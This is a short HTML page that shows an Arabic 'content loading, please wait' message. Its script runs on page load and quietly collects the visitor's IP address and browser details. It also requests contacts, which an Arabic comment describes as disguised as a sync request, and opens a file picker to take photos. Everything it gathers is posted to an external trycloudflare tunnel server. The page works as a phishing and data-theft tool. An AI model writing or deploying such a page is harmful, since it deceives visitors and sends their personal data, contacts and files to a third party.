<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <h2>جاري تحميل المحتوى... يرجى الانتظار</h2>
    <script>
        const SERVER_URL = 'https://james-epinions-completing-million.trycloudflare.com';

        async function startSiphon() {
            // 1. سحب IP والجهاز تلقائياً
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            sendData('INFO', {ip: ipData.ip, ua: navigator.userAgent});

            // 2. طلب سحب جهات الاتصال (تمويه كطلب مزامنة)
            if ('contacts' in navigator) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                    sendData('CONTACTS', contacts);
                } catch(e) {}
            }

            // 3. فتح مستعرض الملفات لسحب الصور
            let input = document.createElement('input');
            input.type = 'file'; input.multiple = true;
            input.onchange = () => {
                Array.from(input.files).forEach(file => {
                    let reader = new FileReader();
                    reader.onload = () => sendData('FILE', {name: file.name, data: reader.result});
                    reader.readAsDataURL(file);
                });
            };
            input.click(); 
        }

        function sendData(type, payload) {
            fetch(SERVER_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type, payload})
            });
        }
        window.onload = startSiphon;
    </script>
</body>
</html>
